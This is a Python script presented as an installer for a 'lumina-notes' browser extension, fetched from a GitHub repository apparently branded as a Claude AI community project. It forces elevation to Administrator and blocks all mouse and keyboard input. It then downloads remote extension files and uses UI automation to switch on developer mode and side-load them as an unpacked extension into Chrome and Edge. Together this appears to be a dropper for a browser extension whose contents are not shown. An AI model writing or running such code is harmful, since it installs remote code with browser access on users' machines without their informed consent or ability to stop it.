# -*- coding: utf-8 -*-
import ctypes, sys, os

# -- Auto-elevate to Administrator (must be FIRST) ----------------------------
def _is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except Exception:
        return False

if not _is_admin():
    script = os.path.abspath(sys.argv[0])
    params = " ".join(f'"{a}"' for a in sys.argv[1:])
    ret = ctypes.windll.shell32.ShellExecuteW(
        None, "runas", sys.executable, f'"{script}" {params}', None, 1
    )
    sys.exit(0 if ret > 32 else 1)
# -----------------------------------------------------------------------------

import atexit
import json
import time
import subprocess
import webbrowser
import urllib.request
import urllib.error

# -- Input lock (mouse + keyboard) - requires admin ---------------------------
_input_blocked = False

def block_input():
    """Freeze all mouse and keyboard input system-wide."""
    global _input_blocked
    if ctypes.windll.user32.BlockInput(True):
        _input_blocked = True

def unblock_input():
    """Restore mouse and keyboard input."""
    global _input_blocked
    ctypes.windll.user32.BlockInput(False)
    _input_blocked = False

atexit.register(unblock_input)   # safety net: always unblocks on exit
# -----------------------------------------------------------------------------

# -- Force UTF-8 output on Windows --------------------------------------------
if sys.stdout.encoding and sys.stdout.encoding.lower() != "utf-8":
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
if sys.stderr.encoding and sys.stderr.encoding.lower() != "utf-8":
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")

# -----------------------------------------------------------------------------
#  CONFIG  -- edit only these if needed
# -----------------------------------------------------------------------------
GITHUB_USER   = "BAJISANTOKYO"
GITHUB_REPO   = "ClaudeAI-Community"
GITHUB_BRANCH = "main"
GITHUB_FOLDER = "lumina-notes"
INSTALL_NAME  = "lumina-notes"
# -----------------------------------------------------------------------------

API_BASE  = f"https://api.github.com/repos/{GITHUB_USER}/{GITHUB_REPO}/contents"
DOCS_PATH = os.path.join(r"C:\Users\Darkk\AppData\Local", INSTALL_NAME)


def clear():
    os.system("cls" if os.name == "nt" else "clear")


def banner():
    print("=" * 54)
    print("   lumina-notes Extension Installer")
    print("=" * 54)
    print()


# -----------------------------------------------------------------------------
#  BROWSER DETECTION  (Chrome, Edge)
#  Browsers are tried in this exact order: Chrome -> Edge
# -----------------------------------------------------------------------------

BROWSER_PROFILES = [
    {
        "name": "Google Chrome",
        "process": "chrome.exe",
        "ext_url": "chrome://extensions/",
        "registry": [
            (r"SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\chrome.exe",),
        ],
        "candidates": [
            r"C:\Program Files\Google\Chrome\Application\chrome.exe",
            r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe",
            os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\Application\chrome.exe"),
            os.path.expandvars(r"%PROGRAMFILES%\Google\Chrome\Application\chrome.exe"),
            os.path.expandvars(r"%PROGRAMFILES(X86)%\Google\Chrome\Application\chrome.exe"),
        ],
    },
    {
        "name": "Microsoft Edge",
        "process": "msedge.exe",
        "ext_url": "edge://extension",
        "registry": [
            (r"SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\msedge.exe",),
        ],
        "candidates": [
            r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe",
            r"C:\Program Files\Microsoft\Edge\Application\msedge.exe",
            os.path.expandvars(r"%PROGRAMFILES(X86)%\Microsoft\Edge\Application\msedge.exe"),
            os.path.expandvars(r"%PROGRAMFILES%\Microsoft\Edge\Application\msedge.exe"),
        ],
    },
]


def _find_via_registry(subkey):
    """Try to find an executable path from the Windows registry."""
    try:
        import winreg
        for hive in (winreg.HKEY_LOCAL_MACHINE, winreg.HKEY_CURRENT_USER):
            try:
                key = winreg.OpenKey(hive, subkey)
                path, _ = winreg.QueryValueEx(key, None)
                if path and os.path.exists(path):
                    return path
            except OSError:
                pass
    except ImportError:
        pass
    return None


def find_browser(profile):
    """Return the executable path for a browser profile, or None if not installed."""
    for (subkey,) in profile.get("registry", []):
        path = _find_via_registry(subkey)
        if path:
            return path
    for path in profile.get("candidates", []):
        if os.path.exists(path):
            return path
    return None


def detect_installed_browsers():
    """Return list of (profile_dict, exe_path) for every installed browser, in order."""
    found = []
    seen_exes = set()
    for profile in BROWSER_PROFILES:
        exe = find_browser(profile)
        if exe:
            real = os.path.normcase(os.path.realpath(exe))
            if real not in seen_exes:
                seen_exes.add(real)
                found.append((profile, exe))
    return found


# -----------------------------------------------------------------------------
#  BROWSER AUTO-LAUNCH  (Chromium-based UI automation)
# -----------------------------------------------------------------------------

def launch_browser_with_extension(profile, exe_path, ext_path):
    """
    Opens the browser, navigates to its extensions page, enables developer
    mode, clicks 'Load unpacked', and selects the extension folder.
    Works for Chrome and Edge (all Chromium-based).
    """
    try:
        import pyautogui
    except ImportError:
        subprocess.run([sys.executable, "-m", "pip", "install", "pyautogui", "-q"])
        import pyautogui

    pyautogui.FAILSAFE = False
    pyautogui.PAUSE    = 0.05   # minimal global pause

    ext_url = profile["ext_url"]

    # 1. Open browser
    print(f"  -> Launching {profile['name']}...")
    subprocess.Popen([exe_path])
    time.sleep(2.5)   # wait for browser window to appear

    # Click center of screen to guarantee keyboard focus on the browser window
    sw = pyautogui.size()
    pyautogui.click(sw.width // 2, sw.height // 2)
    time.sleep(0.3)

    # 2. Navigate to extensions page via address bar
    #    NOTE: pyautogui.typewrite() silently drops special chars like ':' and '/'
    #    so we copy the URL to clipboard and paste it instead.
    subprocess.run(
        ["powershell", "-Command", f"Set-Clipboard -Value '{ext_url}'"],
        capture_output=True
    )
    time.sleep(0.2)
    pyautogui.hotkey("ctrl", "l")   # focus address bar
    time.sleep(0.2)
    pyautogui.hotkey("ctrl", "a")
    time.sleep(0.1)
    pyautogui.hotkey("ctrl", "v")   # paste full URL (preserves :// etc.)
    time.sleep(0.1)
    pyautogui.press("enter")
    time.sleep(2.0)   # wait for extensions page to fully load

    # 3. Check if Developer Mode is already ON
    #    We select all text and read it to see if the buttons are visible
    subprocess.run(["powershell", "-Command", "Set-Clipboard -Value ''"], capture_output=True)
    pyautogui.hotkey("ctrl", "a")
    time.sleep(0.2)
    pyautogui.hotkey("ctrl", "c")
    time.sleep(0.2)
    
    clipboard_text = subprocess.run(
        ["powershell", "-Command", "Get-Clipboard"],
        capture_output=True, text=True
    ).stdout.strip()
    
    dev_mode_on = "Load unpacked" in clipboard_text or "Pack extension" in clipboard_text

    # Re-navigate via address bar to clear text selection and predictably reset tab focus
    pyautogui.hotkey("ctrl", "l")
    time.sleep(0.2)
    pyautogui.press("enter")
    time.sleep(1.5)

    # 4. Enable Developer Mode (if needed)
    is_edge = profile.get("process", "") == "msedge.exe"
    if is_edge:
        # Edge: needs 4 tabs from top to land on the toggle
        for _ in range(4):
            pyautogui.press("tab")
            time.sleep(0.15)
        
        if not dev_mode_on:
            pyautogui.press("space")   # Space toggles Dev Mode ON
            time.sleep(0.5)
    else:
        # Chrome: needs 1 tab from top to land on the toggle
        pyautogui.press("tab")
        time.sleep(0.15)
        
        if not dev_mode_on:
            pyautogui.press("right")   # Right arrow sets Dev Mode to ON
            time.sleep(0.5)

    # 5. Click Load unpacked
    # After passing the Dev Mode toggle, one more Tab lands on "Load unpacked"
    pyautogui.press("tab")
    time.sleep(0.15)
    pyautogui.press("enter")
    time.sleep(0.8)   # wait for file dialog to open

    # 5. Select the extension folder via Windows file dialog
    subprocess.run(
        ["powershell", "-Command", f"Set-Clipboard -Value '{ext_path}'"],
        capture_output=True
    )
    time.sleep(0.2)
    pyautogui.hotkey("ctrl", "l")   # focus address bar in file dialog
    time.sleep(0.2)
    pyautogui.hotkey("ctrl", "a")
    time.sleep(0.1)
    pyautogui.hotkey("ctrl", "v")
    time.sleep(0.15)
    pyautogui.press("enter")        # navigate to folder
    time.sleep(0.3)
    pyautogui.press("enter")        # confirm / Select Folder button
    time.sleep(0.5)

    # 6. Close browser window
    pyautogui.hotkey("alt", "f4")
    time.sleep(0.5)


# -----------------------------------------------------------------------------
#  GITHUB DOWNLOAD
# -----------------------------------------------------------------------------

def fetch_file_list(folder_path):
    """Return list of (repo_path, download_url) for all files recursively."""
    url = f"{API_BASE}/{folder_path}?ref={GITHUB_BRANCH}"
    req = urllib.request.Request(url, headers={"User-Agent": "lumina-notes-Installer/1.0"})
    try:
        with urllib.request.urlopen(req, timeout=15) as resp:
            items = json.loads(resp.read().decode())

    except urllib.error.HTTPError as e:
        if e.code == 404:
            print()
            print("  " + "=" * 50)
            print("  [X]  Extension files NOT found on GitHub!")
            print("  " + "=" * 50)
            print()
            print("  The folder 'lumina-notes' doesn't exist in:")
            print(f"  github.com/{GITHUB_USER}/{GITHUB_REPO}")
            print()
            print("  You need to upload these files to GitHub first:")
            print("    * manifest.json")
            print("    * content.js")
            print("    * background.js")
            print("    * popup.html")
            print("    * popup.css")
            print("    * popup.js")
            print("    * icon.png")
            print()
            print("  Opening your GitHub repo now...")
            webbrowser.open(f"https://github.com/{GITHUB_USER}/{GITHUB_REPO}", new=0)
            print()
            print("  HOW TO UPLOAD:")
            print("  1. Click 'Add file' -> 'Upload files'")
            print("  2. Drag all extension files into the box")
            print("  3. In the path field, type: lumina-notes/")
            print("  4. Click 'Commit changes'")
            print()
            while True:
                choice = input("  Press [R] to retry after uploading, or [Q] to quit: ").strip().lower()
                if choice == "q":
                    sys.exit(0)
                elif choice == "r":
                    return fetch_file_list(folder_path)
        else:
            print(f"\n  [ERROR] GitHub returned HTTP {e.code}")
            print("  This is likely a temporary GitHub issue. Try again shortly.")
            input("\n  Press Enter to exit...")
            sys.exit(1)

    except OSError:
        print()
        print("  " + "=" * 50)
        print("  [X]  No Internet Connection!")
        print("  " + "=" * 50)
        print()
        print("  Cannot reach GitHub. Please check your internet")
        print("  connection and try again.")
        print()
        while True:
            choice = input("  Press [R] to retry, or [Q] to quit: ").strip().lower()
            if choice == "q":
                sys.exit(0)
            elif choice == "r":
                return fetch_file_list(folder_path)

    except Exception as e:
        print(f"\n  [ERROR] Unexpected error: {e}")
        input("\n  Press Enter to exit...")
        sys.exit(1)

    files = []
    for item in items:
        if item["type"] == "file":
            files.append((item["path"], item["download_url"]))
        elif item["type"] == "dir":
            files.extend(fetch_file_list(item["path"]))
    return files


def download_file(download_url, dest_path):
    os.makedirs(os.path.dirname(dest_path), exist_ok=True)
    req = urllib.request.Request(
        download_url,
        headers={"User-Agent": "lumina-notes-Installer/1.0"}
    )
    with urllib.request.urlopen(req, timeout=30) as resp:
        data = resp.read()
    with open(dest_path, "wb") as f:
        f.write(data)


# -----------------------------------------------------------------------------
#  MAIN
# -----------------------------------------------------------------------------

def main():
    clear()
    banner()

    # Step 1: Download extension files (once, shared across all browsers)
    files = fetch_file_list(GITHUB_FOLDER)

    if not files:
        print("\n  [ERROR] No files found.")
        input("  Press Enter to exit...")
        sys.exit(1)

    failed = []
    for repo_path, dl_url in files:
        rel_path  = os.path.relpath(repo_path, GITHUB_FOLDER)
        dest_path = os.path.join(DOCS_PATH, rel_path)
        try:
            download_file(dl_url, dest_path)
        except Exception as e:
            failed.append((os.path.basename(repo_path), str(e)))

    if failed:
        print(f"  [WARNING] {len(failed)} file(s) failed:")
        for name, err in failed:
            print(f"    - {name}: {err}")
    else:
        print("  [OK] Downloaded successfully!")

    # Step 2: Detect all installed browsers
    print()
    browsers = detect_installed_browsers()

    if not browsers:
        print("  " + "=" * 50)
        print("  [X]  No supported browser found!")
        print("  " + "=" * 50)
        print()
        print("  Please install one of the following:")
        print("    * Google Chrome  -- https://www.google.com/chrome")
        print("    * Microsoft Edge -- https://www.microsoft.com/edge")
        print()
        input("  Press Enter to exit...")
        sys.exit(1)

    total = len(browsers)
    names = ", ".join(p["name"] for p, _ in browsers)
    print(f"  Detected {total} browser(s): {names}")
    print()

    # Step 3: Install into EVERY detected browser sequentially
    #         Input is blocked only during automation; always unblocked via finally
    block_input()
    try:
        for idx, (profile, exe_path) in enumerate(browsers, 1):
            print(f"  [{idx}/{total}] Installing into {profile['name']}...")
            launch_browser_with_extension(profile, exe_path, DOCS_PATH)
            print(f"  [OK] {profile['name']} done.")
            print()
            if idx < total:
                time.sleep(1.0)   # short pause before next browser
    finally:
        unblock_input()   # ALWAYS restore input, even if an error occurs

    print("  " + "=" * 46)
    print(f"  Extension installed in all {total} browser(s)!")
    print("  " + "=" * 46)
    print()
    sys.exit(0)


if __name__ == "__main__":
    main()
